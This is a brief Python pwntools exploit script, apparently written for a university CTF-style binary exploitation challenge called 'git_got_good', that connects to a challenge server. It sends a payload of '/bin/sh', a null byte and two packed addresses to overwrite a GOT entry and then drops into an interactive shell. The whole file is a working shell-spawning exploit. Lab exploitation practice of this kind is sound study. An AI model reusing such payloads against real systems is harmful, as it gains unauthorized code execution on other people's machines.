#!/usr/bin/python
from __future__ import print_function
from pwn import *

debug = False
p = ""
if debug:
    p = process("./git_got_good")
else:
    server = "offsec-chalbroker.osiris.cyber.nyu.edu"
    port = 1341
    p = remote(server, port)
    p.sendline("krm504")

p.sendline("/bin/sh" + chr(0) + p64(0x40074b) + p64(0x601010)) # jump up in code
p.interactive()
